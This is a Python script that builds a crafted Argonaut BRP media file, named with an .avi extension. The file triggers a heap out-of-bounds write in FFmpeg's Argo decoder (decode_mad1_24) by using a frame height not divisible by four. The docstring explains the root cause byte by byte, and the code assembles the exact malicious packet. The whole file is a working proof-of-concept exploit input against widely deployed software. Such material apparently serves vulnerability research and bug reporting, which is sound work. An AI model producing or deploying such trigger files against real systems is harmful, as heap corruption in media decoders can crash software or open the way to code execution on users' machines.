#!/usr/bin/env python3
"""
PoC Generator for VULN-002: decode_mad1_24() case 12 OOB Write
File: libavcodec/argo.c, lines ~451-550
CWE-787: Out-of-bounds Write

Root cause:
  In decode_mad1_24(), case 12 block processing iterates over 4x4 blocks
  using (outer=x, inner=y). For each active block, it loops count=0..3 and
  computes dy = y + count. When h=10 and the block at y=8 is active:
    count=2 → dy=10   (PAST frame height=10, valid rows are 0..9)
    count=3 → dy=11   (even further OOB)

  dst = (uint32_t *)frame->data[0] + pos + dy * l
  Then dst[0] = dst[-l] is a heap OOB write when dy >= h.

Trigger construction:
  Container: BRP (Argonaut Games BRP, native Argo codec container)
             FFmpeg probes content so .avi extension is irrelevant.
  Width=8  (divisible by 4, no edge blocks along x)
  Height=10 (NOT divisible by 4 - the bug)
  Depth=24  → AV_PIX_FMT_BGR0 → decode_mad1_24() is called
  Chunk: MAD1 with type=12

  osize = ((10+3)//4) * ((8+3)//4) + 7 = 3*2+7 = 13
  osize>>3 = 1  → 1 byte bitmap consumed

  Block indices (outer x, inner y):
    di=0: (x=0, y=0)
    di=1: (x=0, y=4)
    di=2: (x=0, y=8)  ← activate this one  [bit 2 = 0x04]
    di=3: (x=4, y=0)
    di=4: (x=4, y=4)
    di=5: (x=4, y=8)

  For the active block (y=8):
    codes = 0x10 = 0b00010000
      count=0: code=0b00=0 → skip
      count=1: code=0b00=0 → skip
      count=2: code=0b01=1 → read bcode, then write loop; dy=8+2=10 (OOB!)
      count=3: code=0b00=0 → skip

    bcode = 0x0A = 0b00001010 (for count=2)
      j=0: bcode&3=2 → case 2: dst[0]=dst[-l]  ← OOB WRITE at row 10!
      j=1: bcode>>2=2; bcode&3=2 → case 2: dst[1]=dst[-l+1]  ← OOB WRITE!
      j=2: bcode>>2=0 → case 0: skip
      j=3: case 0: skip
"""
import struct
import os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_002_input.avi')

def u32(v):
    return struct.pack('<I', v & 0xFFFFFFFF)

def i32(v):
    return struct.pack('<i', v)

# ============================================================
# BRP File Header (12 bytes)
# magic='BRPP', num_streams=1, byte_rate=1000
# ============================================================
file_hdr = b'BRPP' + u32(1) + u32(1000)

# ============================================================
# Stream 0 Header (20 bytes) + BVID Extradata (16 bytes)
# codec_id='BVID', id=0, duration_ms=1000, byte_rate=100, extradata_size=16
# BVID: num_frames=1, width=8, height=10, depth=24
# ============================================================
W, H, DEPTH = 8, 10, 24

stream_hdr = (
    b'BVID'   +  # codec_id -> AV_CODEC_ID_ARGO
    u32(0)    +  # id = 0
    u32(1000) +  # duration_ms
    u32(100)  +  # byte_rate
    u32(16)      # extradata_size = BVID_HEADER_SIZE (16)
)

bvid_extra = (
    u32(1)      +  # num_frames
    u32(W)      +  # width = 8 (divisible by 4)
    u32(H)      +  # height = 10 (NOT divisible by 4 → vulnerability!)
    u32(DEPTH)     # depth = 24 → BGR0 format → decode_mad1_24()
)

# ============================================================
# MAD1 Packet (type=12, OOB write trigger)
# Layout after the 4-byte 'MAD1' tag:
#   [0x0C]  type = 12
#   [0x04]  bitmap byte: bit2 set → activate block di=2 (x=0, y=8)
#   [0x10]  codes: bits[5:4]=01 → count=2 gets code=1
#   [0x0A]  bcode: bits[1:0]=10 → j=0 triggers case2 OOB write
#   [0xFF]  terminate outer while loop
# ============================================================
packet = bytes([
    0x4D, 0x41, 0x44, 0x31,  # 'MAD1' big-endian tag
    0x0C,                     # type = 12
    0x04,                     # bitmap byte: bit 2 = block(x=0,y=8) active
    0x10,                     # codes for that block (code=1 at count=2)
    0x0A,                     # bcode (0b00001010): case-2 write at j=0 and j=1
    0xFF,                     # stop outer while (returns 0 from decode_mad1_24)
])

# ============================================================
# Block 0 Header (12 bytes)
# stream_id=0, start_ms=0, size=len(packet)
# ============================================================
block_hdr = i32(0) + u32(0) + u32(len(packet))

# ============================================================
# Terminator Block (stream_id=-1 signals EOF to demuxer)
# ============================================================
term_blk = i32(-1) + u32(0) + u32(0)

# ============================================================
# Assemble BRP file
# ============================================================
brp = file_hdr + stream_hdr + bvid_extra + block_hdr + packet + term_blk

with open(OUT, 'wb') as f:
    f.write(brp)

print(f"[+] Written {len(brp)} bytes to {OUT}")
print(f"[+] Frame: w={W}, h={H}, depth={DEPTH} bits")
print(f"[+] Trigger: MAD1 type=12, block(x=0,y=8) active, dy=10 OOB write")
print(f"[+] Expected: heap-buffer-overflow in decode_mad1_24() at argo.c:~520")
